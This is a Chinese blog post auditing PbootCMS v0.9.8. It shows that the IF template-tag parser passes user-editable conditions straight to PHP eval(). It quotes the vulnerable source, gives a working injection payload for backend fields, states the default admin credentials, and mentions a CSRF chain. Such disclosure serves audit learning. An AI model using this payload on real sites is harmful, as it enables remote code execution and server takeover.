<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="vQAQv"><meta name="description" content="喜欢电影，喜欢美食，喜欢旅游，也喜欢你💖~"><link rel="icon" href="/favicon.png"><title>PbootCMS v0.9.8 后台 Getshell - vQAQv's blog | Just Do It!</title><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css"><!--[if lt IE 9]><script>(function(a,b){a="abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video".split(" ");for(b=a.length-1;b>=0;b--)document.createElement(a[b])})()</script><![endif]--><script src="/js/jquery-3.1.1.min.js"></script><script src="/js/fancybox/jquery.fancybox.min.js"></script></head><body style="opacity:1"><header class="head"><h1 class="head-title u-fl"><a href="/">vQAQv's blog | Just Do It!</a></h1><nav class="head-nav u-fr"><ul class="head-nav__list"><li class="head-nav__item"><a class="head-nav__link" href="/archives">Archives</a></li><li class="head-nav__item"><a class="head-nav__link" href="/about">About Me</a></li></ul></nav></header><main class="main"><article class="post"><header class="post__head"> <time class="post__time" datetime="2018-04-11T15:50:00.000Z">四月 11, 2018</time><h1 class="post__title"><a href="/2018/04/11/pbootcms/">PbootCMS v0.9.8 后台 Getshell</a></h1><div class="post__main echo"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PBOOT CMS!想伱所想,让一切皆有可能!</span><br><span class="line"></span><br><span class="line">PBOOT CMS!为伱所想,让一切皆有可能!</span><br><span class="line"></span><br><span class="line">PBOOT CMS!做伱所想,让一切皆有可能!</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>php代码审计的初学者，所以就先从D类CMS入手。</p>
<p>后台默认账号：<code>admin</code> 密码：<code>123456</code></p>
<p>代码审计分：</p>
<ul>
<li>危险函数追踪流</li>
<li>通读全文流</li>
<li>黑白盒结合审计流</li>
</ul>
<h1 id="开发者标签手册"><a href="#开发者标签手册" class="headerlink" title="开发者标签手册"></a>开发者标签手册</h1><h2 id="IF条件语句"><a href="#IF条件语句" class="headerlink" title="IF条件语句"></a>IF条件语句</h2><ul>
<li><code>注意：条件语句中字符串需要用单引号或双引号，条件也可以使用原生PHP代码；
所有对其它标签的调用都为字符串，需要加单引号。</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;pboot:<span class="keyword">if</span>(<span class="string">'a'</span>==<span class="string">'b'</span>)&#125;</span><br><span class="line">	内容<span class="number">1</span></span><br><span class="line">&#123;<span class="keyword">else</span>&#125;</span><br><span class="line">	内容<span class="number">2</span></span><br><span class="line">&#123;/pboot:<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>示例一：在IF中使用PHP函数示例：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>(date(<span class="string">'Y'</span>)==<span class="number">2018</span>)&#125;<span class="number">2018</span>年&#123;/pboot:<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>示例二：高亮栏目示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="nav"&gt;</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">     &lt;dt&gt;&lt;a href=<span class="string">"&#123;pboot:sitepath&#125;/"</span> &#123;pboot:<span class="keyword">if</span>(<span class="number">0</span>==<span class="string">'&#123;sort:scode&#125;'</span>)&#125;<span class="class"><span class="keyword">class</span>='<span class="title">active</span>'</span>&#123;/pboot:<span class="keyword">if</span>&#125;&gt;首页&lt;/a&gt;&lt;/dt&gt;</span><br><span class="line">&lt;/dl&gt;</span><br><span class="line">&#123;pboot:nav <span class="keyword">parent</span>=<span class="number">0</span>&#125;</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">	&lt;dt&gt;&lt;a href=<span class="string">"[nav:link]"</span> &#123;pboot:<span class="keyword">if</span>(<span class="string">'[nav:scode]'</span>==<span class="string">'&#123;sort:tcode&#125;'</span>)&#125;<span class="class"><span class="keyword">class</span>='<span class="title">active</span>'</span>&#123;/pboot:<span class="keyword">if</span>&#125;&gt;[nav:name]&lt;/a&gt;&lt;/dt&gt;</span><br><span class="line">	&lt;dd&gt;</span><br><span class="line">	&#123;pboot:<span class="number">2</span>nav <span class="keyword">parent</span>=[nav:scode]&#125;</span><br><span class="line">		&lt;a href=<span class="string">"[2nav:link]"</span>  &#123;pboot:<span class="keyword">if</span>(<span class="string">'[2nav:scode]'</span>==<span class="string">'&#123;sort:scode&#125;'</span>)&#125;<span class="class"><span class="keyword">class</span>='<span class="title">active</span>'</span>&#123;/pboot:<span class="keyword">if</span>&#125;&gt;[<span class="number">2</span>nav:name]&lt;/a&gt; |</span><br><span class="line">	&#123;/pboot:<span class="number">2</span>nav&#125;</span><br><span class="line">	&lt;/dd&gt;</span><br><span class="line">&lt;/dl&gt;</span><br><span class="line">&#123;/pboot:nav&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>示例三：嵌套IF：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>(<span class="string">'a'</span>==<span class="string">'b'</span>)&#125;</span><br><span class="line">	&#123;pboot:<span class="number">2</span><span class="keyword">if</span>(<span class="string">'a'</span>==<span class="string">'b'</span>)&#125;</span><br><span class="line">		内容<span class="number">1</span></span><br><span class="line">	&#123;<span class="number">2</span><span class="keyword">else</span>&#125;</span><br><span class="line">		内容<span class="number">2</span></span><br><span class="line">	&#123;/pboot:<span class="number">2</span><span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">else</span>&#125;</span><br><span class="line">	内容<span class="number">3</span></span><br><span class="line">&#123;/pboot:<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>这里说了可执行PHP语句，但要插在<code>IF条件标签</code>，例如：</p>
<p><code>{pboot:if(php语句)} {/pboot:if}</code></p>
<p>然后再返回文件查看源代码文件：</p>
<p>该文件是：标签解析引擎控制器，也就是解析标签的。</p>
<p>代码的<code>1273~1314</code>为关于IF条件语句的。</p>
<p><code>/apps/home/controller/ParserController.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析IF条件标签</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span><span class="params">($content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $pattern = <span class="string">'/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/'</span>;</span><br><span class="line">    $pattern2 = <span class="string">'/pboot:([0-9])+if/'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all($pattern, $content, $matches)) &#123;</span><br><span class="line">        $count = count($matches[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $count; $i ++) &#123;</span><br><span class="line">            $flag = <span class="string">''</span>;</span><br><span class="line">            $out_html = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">'if('</span> . $matches[<span class="number">1</span>][$i] . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/'</span>, $matches[<span class="number">2</span>][$i], $matches2)) &#123; <span class="comment">// 判断是否存在else</span></span><br><span class="line">                <span class="keyword">switch</span> ($flag) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'if'</span>: <span class="comment">// 条件为真</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>($matches2[<span class="number">1</span>])) &#123;</span><br><span class="line">                            $out_html = $matches2[<span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'else'</span>: <span class="comment">// 条件为假</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>($matches2[<span class="number">2</span>])) &#123;</span><br><span class="line">                            $out_html = $matches2[<span class="number">2</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($flag == <span class="string">'if'</span>) &#123;</span><br><span class="line">                $out_html = $matches[<span class="number">2</span>][$i];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 无限极嵌套解析</span></span><br><span class="line">            <span class="keyword">if</span> (preg_match($pattern2, $out_html, $matches3)) &#123;</span><br><span class="line">                $out_html = str_replace(<span class="string">'pboot:'</span> . $matches3[<span class="number">1</span>] . <span class="string">'if'</span>, <span class="string">'pboot:if'</span>, $out_html);</span><br><span class="line">                $out_html = str_replace(<span class="string">'&#123;'</span> . $matches3[<span class="number">1</span>] . <span class="string">'else&#125;'</span>, <span class="string">'&#123;else&#125;'</span>, $out_html);</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel($out_html);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 执行替换</span></span><br><span class="line">            $content = str_replace($matches[<span class="number">0</span>][$i], $out_html, $content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键在：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">'/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/'</span>;</span><br><span class="line">$pattern2 = <span class="string">'/pboot:([0-9])+if/'</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match_all($pattern, $content, $matches)) &#123;</span><br><span class="line">    $count = count($matches[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $count; $i ++) &#123;</span><br><span class="line">        $flag = <span class="string">''</span>;</span><br><span class="line">        $out_html = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'if('</span> . $matches[<span class="number">1</span>][$i] . <span class="string">')&#123;$flag="if";&#125;else&#123;$flag="else";&#125;'</span>);</span><br></pre></td></tr></table></figure>
<p>只经过简单的正则匹配之后就赋值，然后<code>eval()</code>执行。</p>
<p>到此需要寻在利用点。</p>
<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><p>Poc:</p>
<p><code>{pboot:if(phpinfo())}!{/pboot:if}</code></p>
<p>最后经过寻找，只要发现后台能编辑的地方，基本上都能插入<code>IF条件语句标签</code>并能解析执行。</p>
<p><img src="/image/pbootcms/poc.png" alt="poc.png"></p>
<p>访问首页就可以看到<code>phpinfo</code>页面</p>
<p><img src="/image/phpinfo.png" alt="phpinfo.png"></p>
<p>然后尝试了多次多点均能Getshell.</p>
<h1 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h1><p>前台某处存在CSRF，利用其修改后台内容，但均有提升<code>修改成功</code>的页面，做不到无感知修改内容，因此<code>CSRF+IF条件语句标签</code>也是比较鸡肋。</p>
<p><img src="/image/pbootcms/mod.png" alt="mod.png"></p>
</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/代码审计/">代码审计</a></li><li class="post__tag__item"><a class="post__tag__link" href="/tags/CMS/">CMS</a></li></ul></footer></article><section class="reward"> <a class="btn-reward" href="#">Contact me</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="微信"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016-2019 vQAQv</div></footer><script src="/js/scroller.js"></script><script src="/js/main.js"></script></body></html>